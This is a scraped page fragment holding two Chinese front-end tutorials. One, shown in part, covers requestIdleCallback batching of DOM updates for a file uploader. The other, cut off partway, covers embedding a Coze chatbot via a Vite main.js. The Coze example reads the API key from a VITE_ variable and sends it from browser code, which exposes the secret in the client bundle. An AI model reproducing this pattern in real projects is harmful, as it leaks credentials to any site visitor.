          <span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> = <span class="hljs-literal">false</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">process</span>();
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> = <span class="hljs-literal">false</span>;
        }
      },
      { <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> } <span class="hljs-comment">// 5 秒超时，确保任务最终会被执行</span>
    );
  }

  <span class="hljs-comment">/**
   * 清空队列
   */</span>
  <span class="hljs-title function_">clear</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span> = [];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentHandle</span> !== <span class="hljs-literal">null</span>) {
      <span class="hljs-title function_">cancelIdleCallback</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentHandle</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentHandle</span> = <span class="hljs-literal">null</span>;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isProcessing</span> = <span class="hljs-literal">false</span>;
  }

  <span class="hljs-comment">/**
   * 获取队列中剩余任务数
   */</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">length</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-property">length</span>;
  }
}
</code></pre>
<h3 data-id="heading-4">2. DOM 更新优化</h3>
<p>优化前:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用 setTimeout 延迟更新</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">timmer</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">patch</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">vNode</span>, vNode);
  <span class="hljs-comment">// ...</span>
}, <span class="hljs-variable constant_">DOM_UPDATE_DELAY_MS</span>);
</code></pre>
<p>优化后:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用 requestIdleCallback 在浏览器空闲时更新</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">idleCallbackHandle</span> = <span class="hljs-title function_">requestIdleCallback</span>(
  <span class="hljs-function">(<span class="hljs-params">deadline</span>) =&gt;</span> {
    <span class="hljs-comment">// 检查是否有足够的时间</span>
    <span class="hljs-keyword">if</span> (deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">5</span> &amp;&amp; !deadline.<span class="hljs-property">didTimeout</span>) {
      <span class="hljs-comment">// 重新调度到下一个空闲周期</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">idleCallbackHandle</span> = <span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-comment">/* ... */</span>);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">performDomUpdate</span>(deadline);
  },
  { <span class="hljs-attr">timeout</span>: <span class="hljs-variable constant_">DOM_UPDATE_DELAY_MS</span> }
);
</code></pre>
<p>优势:</p>
<ul>
<li>🚀 不阻塞主线程: DOM 更新在浏览器空闲时执行</li>
<li>🎯 智能调度: 如果当前空闲时间不够，自动延迟到下一个空闲周期</li>
<li>⏱️ 超时保护: 即使浏览器一直忙碌，也会在超时后执行</li>
</ul>
<h3 data-id="heading-5">3. 批量更新优化</h3>
<p>优化前:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 场景：数据变化时，更新对应的dom显示</span>
handleHeartbeat = (<span class="hljs-attr">uploader</span>: <span class="hljs-title class_">FileUploader</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; uploader.<span class="hljs-property">uploadingTaskList</span>.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> taskItem = uploader.<span class="hljs-property">uploadingTaskList</span>[i];
    <span class="hljs-keyword">const</span> item = <span class="hljs-variable language_">this</span>.<span class="hljs-property">itemsMap</span>.<span class="hljs-title function_">get</span>(taskItem.<span class="hljs-property">id</span>);
    <span class="hljs-keyword">if</span> (item) {
      item.<span class="hljs-title function_">updateDom</span>(taskItem); <span class="hljs-comment">// 立即执行</span>
    }
  }
};
</code></pre>
<p>优化后:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 批量收集更新任务，在空闲时执行</span>
handleHeartbeat = (<span class="hljs-attr">uploader</span>: <span class="hljs-title class_">FileUploader</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-attr">updateTasks</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>&gt; = [];

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; uploader.<span class="hljs-property">uploadingTaskList</span>.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">const</span> taskItem = uploader.<span class="hljs-property">uploadingTaskList</span>[i];
    <span class="hljs-keyword">const</span> item = <span class="hljs-variable language_">this</span>.<span class="hljs-property">itemsMap</span>.<span class="hljs-title function_">get</span>(taskItem.<span class="hljs-property">id</span>);
    <span class="hljs-keyword">if</span> (item) {
      updateTasks.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> {
        item.<span class="hljs-title function_">updateDom</span>(taskItem);
      });
    }
  }

  <span class="hljs-comment">// 批量添加到空闲任务队列</span>
  <span class="hljs-keyword">if</span> (updateTasks.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">idleUpdateQueue</span>.<span class="hljs-title function_">addBatch</span>(updateTasks);
  }
};
</code></pre>
<p>优势:</p>
<ul>
<li>📦 批量处理: 多个 DOM 更新在同一个空闲周期内批量处理</li>
<li>⚡ 减少重排: 减少浏览器重排/重绘次数</li>
<li>🎯 优先级管理: 非关键更新不会阻塞关键操作</li>
</ul>
<h2 data-id="heading-6">使用场景</h2>
<h3 data-id="heading-7">适合使用 requestIdleCallback​ 的场景</h3>
<ol>
<li>
<p>✅ DOM 更新（非关键）</p>
<ul>
<li>进度条更新</li>
<li>状态显示更新</li>
<li>统计数据展示</li>
</ul>
</li>
<li>
<p>✅ 数据统计/分析</p>
<ul>
<li>上传速度计算</li>
<li>进度统计</li>
<li>性能指标收集</li>
</ul>
</li>
<li>
<p>✅ 预加载/预取</p>
<ul>
<li>预加载下一个文件</li>
<li>预计算 MD5</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">不适合使用 requestIdleCallback​ 的场景</h3>
<ol>
<li>
<p>❌ 用户交互响应</p>
<ul>
<li>点击事件处理</li>
<li>输入事件处理</li>
<li>必须立即响应的操作</li>
</ul>
</li>
<li>
<p>❌ 关键路径操作</p>
<ul>
<li>文件上传请求</li>
<li>错误处理</li>
<li>状态变更通知</li>
</ul>
</li>
</ol>
<h2 data-id="heading-9">性能收益</h2>
<h3 data-id="heading-10">预期改进</h3>
<ol>
<li>主线程阻塞减少: DOM 更新不再阻塞主线程，提升页面响应性</li>
<li>帧率提升: 减少不必要的重排/重绘，提升动画流畅度</li>
<li>CPU 使用优化: 在浏览器空闲时执行任务，更好地利用 CPU 资源</li>
<li>用户体验提升: 页面更流畅，交互更及时</li>
</ol>
<h3 data-id="heading-11">实际测试建议</h3>
<ol>
<li>Chrome DevTools Performance: 检查主线程阻塞情况</li>
<li>FPS 监控: 监控帧率变化</li>
<li>Lighthouse: 运行性能测试</li>
<li>真实场景测试: 测试大量文件上传时的性能</li>
</ol>
<h2 data-id="heading-12">浏览器兼容性</h2>
<h3 data-id="heading-13">原生支持</h3>
<ul>
<li>✅ Chrome 47+</li>
<li>✅ Edge 79+</li>
<li>✅ Firefox 55+</li>
<li>✅ Safari 不支持（需要降级方案）</li>
</ul>
<h3 data-id="heading-14">降级方案</h3>
<p>我们的实现自动提供了降级方案：</p>
<ul>
<li>使用 MessageChannel​ + setTimeout​ 模拟 requestIdleCallback​</li>
<li>确保所有浏览器都能正常工作</li>
<li>性能可能略低于原生实现，但仍然比直接执行更好</li>
</ul>
<h2 data-id="heading-15">最佳实践</h2>
<h3 data-id="heading-16">1. 合理设置超时时间</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 对于关键更新，设置较短的超时时间</span>
<span class="hljs-title function_">requestIdleCallback</span>(callback, { <span class="hljs-attr">timeout</span>: <span class="hljs-number">100</span> });

<span class="hljs-comment">// 对于非关键更新，可以设置较长的超时时间</span>
<span class="hljs-title function_">requestIdleCallback</span>(callback, { <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> });
</code></pre>
<h3 data-id="heading-17">2. 检查空闲时间</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">requestIdleCallback</span>(<span class="hljs-function">(<span class="hljs-params">deadline</span>) =&gt;</span> {
  <span class="hljs-comment">// 如果时间不够，延迟执行</span>
  <span class="hljs-keyword">if</span> (deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">5</span> &amp;&amp; !deadline.<span class="hljs-property">didTimeout</span>) {
    <span class="hljs-comment">// 重新调度</span>
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 执行任务</span>
  <span class="hljs-title function_">performTask</span>();
});
</code></pre>
<h3 data-id="heading-18">3. 批量处理任务</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用 IdleTaskQueue 批量处理</span>
<span class="hljs-keyword">const</span> queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IdleTaskQueue</span>();
queue.<span class="hljs-title function_">addBatch</span>([
  <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">updateTask1</span>(),
  <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">updateTask2</span>(),
  <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">updateTask3</span>(),
]);
</code></pre>
<h3 data-id="heading-19">4. 清理资源</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 组件销毁时清理</span>
<span class="hljs-title function_">destroy</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">idleCallbackHandle</span>) {
    <span class="hljs-title function_">cancelIdleCallback</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">idleCallbackHandle</span>);
  }
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">idleUpdateQueue</span>.<span class="hljs-title function_">clear</span>();
}
</code></pre>
<h2 data-id="heading-20">注意事项</h2>
<ol>
<li>超时时间: 设置合理的超时时间，确保任务最终会被执行</li>
<li>任务大小: 避免在单个空闲周期内执行过大的任务</li>
<li>错误处理: 确保任务中的错误不会影响后续任务</li>
<li>内存管理: 及时清理不再需要的回调句柄</li>
</ol>
<h2 data-id="heading-21">未来优化方向</h2>
<ol>
<li>IntersectionObserver: 结合使用，只更新可见区域的任务</li>
<li>Web Workers: 将计算密集型任务移到 Worker 线程</li>
<li>虚拟滚动: 对于大量任务列表，使用虚拟滚动优化</li>
<li>增量更新: 只更新变化的部分，而不是整个 DOM</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在你的网页中嵌入 Coze 智能客服：一步步打造专属 AI Agent]]></title>    <link>https://juejin.cn/post/7579889969986109491</link>    <guid>https://juejin.cn/post/7579889969986109491</guid>    <pubDate>2025-12-05T02:47:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579889969986109491" data-draft-id="7579499567868526642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在你的网页中嵌入 Coze 智能客服：一步步打造专属 AI Agent"/> <meta itemprop="keywords" content="JavaScript,人工智能,前端"/> <meta itemprop="datePublished" content="2025-12-05T02:47:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AAA阿giao"/> <meta itemprop="url" content="https://juejin.cn/user/473218785740627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在你的网页中嵌入 Coze 智能客服：一步步打造专属 AI Agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/473218785740627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AAA阿giao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T02:47:26.000Z" title="Fri Dec 05 2025 02:47:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在 AI 浪潮席卷各行各业的今天，智能客服早已不再是“高大上”的专属。借助 <strong>Coze（扣子）平台</strong>，我们每个人都能轻松创建一个属于自己的 AI 客服机器人，并将其无缝集成到任意网页中——无论你是教育产品开发者、SaaS 创业者，还是个人站长。</p>
<p>本文将手把手带你完成这一过程，从知识库构建、Bot 发布，到前端代码调用，尤其会对 <code>main.js</code> 文件进行<strong>逐行详细注释</strong>，确保你不仅“会用”，更“懂原理”。</p>
<hr/>
<h2 data-id="heading-1">一、为什么选择 Coze？</h2>
<p>Coze 是字节跳动推出的 AI Agent 智能办公平台，其核心优势在于：</p>
<ul>
<li><strong>RAG（检索增强生成）技术</strong>：让大模型基于你提供的私有知识库回答问题，避免“胡说八道”。</li>
<li><strong>低代码发布 API</strong>：无需搭建后端，一键生成可调用的 Bot 接口。</li>
<li><strong>多场景适配</strong>：无论是课程咨询、编程答疑，还是法律/医疗知识问答，只需“喂”对资料。</li>
</ul>
<blockquote>
<p>💡 举个例子：你想做一个“Python 编程课”的客服机器人。学生问：“第3章作业怎么提交？”——只要你在知识库里写清楚流程，AI 就能精准回答，而不是瞎猜。</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">二、准备工作：创建并发布你的 Coze Bot</h2>
<ol>
<li>
<p><strong>登录 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.coze.cn%2F" title="https://www.coze.cn/" target="_blank" ref="nofollow noopener noreferrer">Coze 平台</a></strong></strong></p>
</li>
<li>
<p><strong>新建 Bot</strong>，配置如下：</p>
<ul>
<li>添加 <strong>课程知识库</strong>（如 PDF、Markdown、网页链接等）</li>
<li>启用 <strong>RAG 检索</strong>，确保回答基于你的资料</li>
<li>测试对话效果，调整提示词（Prompt）</li>
</ul>
</li>
<li>
<p><strong>发布为 API</strong><br/>
点击「发布」→「API 调用」，你会得到两个关键信息：</p>
<ul>
<li><code>VITE_BOT_ID</code>：你的 Bot 唯一标识（即发布 ID）</li>
<li><code>VITE_API_KEY</code>：调用权限密钥（Token）</li>
</ul>
</li>
</ol>
<p>智能体如图，本文重点讲述如何调用，对如何创建智能体不过多描述，可直接使用本文的示例URL</p>
<p><code>https://www.coze.cn/space/7567783700911013940/bot/7578869824248676361/publish</code></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec9f924a6bc45e5afa86016f7acedfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUFB6Zi_Z2lhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507646&amp;x-signature=sW7%2BFjWmEnj27E%2FV39xN9BZaA9U%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9ae5820c5554cc39c091593862243d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUFB6Zi_Z2lhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507646&amp;x-signature=uN2pzyTV0JyfZTVU714tE%2B2p1qU%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<blockquote>
<p>📌 示例 URL 中已包含 Bot ID：<br/>
<code>https://www.coze.cn/space/7567783700911013940/bot/7578869824248676361/publish</code><br/>
→ <code>7578869824248676361</code> 就是 <code>VITE_BOT_ID</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-3">三、前端集成：在任意网页中调用 Coze Agent</h2>
<p>现在，我们进入最激动人心的部分——把 AI 客服嵌入你的网站！</p>
<p>我们来看一个轻量级示例项目：<strong>coze-agent-demo</strong>，基于 Vite 构建。即使你不用 Vite，也可以直接在 HTML 中引入 JS 文件。</p>
<h3 data-id="heading-4"><strong>项目初始化建议</strong></h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用 Trae（或 Vite）快速创建项目</span>
npm create vite@latest coze-agent-demo -- --template vanilla
cd coze-agent-demo
<span class="hljs-comment"># 在 .env.local 中填入：</span>
<span class="hljs-attr">VITE_BOT_ID</span>=<span class="hljs-number">7578869824248676361</span>
<span class="hljs-attr">VITE_API_KEY</span>=your_coze_api_token_here
</code></pre>
<h3 data-id="heading-5">项目结构简述</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0849abf15c4e4ee0b5595815f514f520~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUFB6Zi_Z2lhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765507646&amp;x-signature=xi1qRIekAoFqkyxMBq9m5swt9h4%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>如果运行时报错显示 main.js 无法读取.env.local 的内容，再创建一个文件 .env 内容如下</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># Coze API环境变量</span>
<span class="hljs-attr">VITE_BOT_ID</span>=demo_bot_id
<span class="hljs-attr">VITE_API_KEY</span>=demo_api_key
</code></pre>
<p>接下来我们将重点解析 <code>main.js</code> 的每一行代码。</p>
<hr/>
<h2 data-id="heading-6">四、逐行详解 <code>main.js</code>：如何与 Coze 对话？</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 从环境变量中读取 Bot ID 和 API Key</span>
<span class="hljs-comment">//    在 Vite 项目中，以 VITE_ 开头的变量会被自动注入到 import.meta.env</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BOT_ID</span> = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_BOT_ID</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_KEY</span> = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_API_KEY</span>;

<span class="hljs-comment">// 2. 定义 Coze API 的请求地址</span>
<span class="hljs-comment">//    这是 Coze 官方提供的对话接口（WebSocket 或 REST？此处为 REST）</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = <span class="hljs-string">'https://api.coze.cn/open_api/v1/chat'</span>;

<span class="hljs-comment">// 3. 获取页面中的 DOM 元素</span>
<span class="hljs-comment">//    - userInput: 用户输入框</span>
<span class="hljs-comment">//    - sendButton: 发送按钮</span>
<span class="hljs-comment">//    - chatBox: 聊天消息展示区域</span>
<span class="hljs-keyword">const</span> userInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'user-input'</span>);
<span class="hljs-keyword">const</span> sendButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'send-button'</span>);
<span class="hljs-keyword">const</span> chatBox = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chat-box'</span>);

<span class="hljs-comment">// 4. 为“发送”按钮绑定点击事件</span>
sendButton.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, sendMessage);

<span class="hljs-comment">// 5. 同时监听回车键（Enter）触发发送</span>
userInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keypress'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'Enter'</span>) {
    <span class="hljs-title function_">sendMessage</span>();
  }
});

<span class="hljs-comment">// 6. 核心函数：发送消息并获取 AI 回复</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendMessage</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 6.1 获取用户输入内容，并去除首尾空格</span>
  <span class="hljs-keyword">const</span> message = userInput.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
  
  <span class="hljs-comment">// 6.2 如果输入为空，直接返回（不发送）</span>
  <span class="hljs-keyword">if</span> (!message) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 6.3 清空输入框，提升用户体验</span>
  userInput.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;

  <span class="hljs-comment">// 6.4 在聊天框中显示用户的消息（左侧气泡）</span>
  <span class="hljs-title function_">appendMessage</span>(<span class="hljs-string">'user'</span>, message);

  <span class="hljs-comment">// 6.5 准备请求体（payload）</span>
  <span class="hljs-comment">//     - bot_id: 你的 Bot 唯一标识</span>
  <span class="hljs-comment">//     - user_id: 可用于区分不同用户（此处简化为固定值）</span>
  <span class="hljs-comment">//     - query: 用户的问题</span>
  <span class="hljs-comment">//     - stream: 是否启用流式响应（此处为 false，使用完整响应）</span>
  <span class="hljs-keyword">const</span> payload = {
    <span class="hljs-attr">bot_id</span>: <span class="hljs-variable constant_">BOT_ID</span>,
    <span class="hljs-attr">user_id</span>: <span class="hljs-string">'user123'</span>, <span class="hljs-comment">// 实际项目中建议用真实用户ID或会话ID</span>
    <span class="hljs-attr">query</span>: message,
    <span class="hljs-attr">stream</span>: <span class="hljs-literal">false</span>
  };

  <span class="hljs-comment">// 6.6 使用 fetch 发起 POST 请求到 Coze API</span>
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-variable constant_">API_URL</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${API_KEY}</span>`</span>, <span class="hljs-comment">// 6.6.1 必须携带 API Key 进行身份验证</span>
        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>     <span class="hljs-comment">// 6.6.2 声明请求体为 JSON</span>
      },
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload) <span class="hljs-comment">// 6.6.3 将 payload 转为 JSON 字符串</span>
    });

    <span class="hljs-comment">// 6.7 检查响应是否成功</span>
    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`API error: <span class="hljs-subst">${response.status}</span>`</span>);
    }

    <span class="hljs-comment">// 6.8 解析返回的 JSON 数据</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();

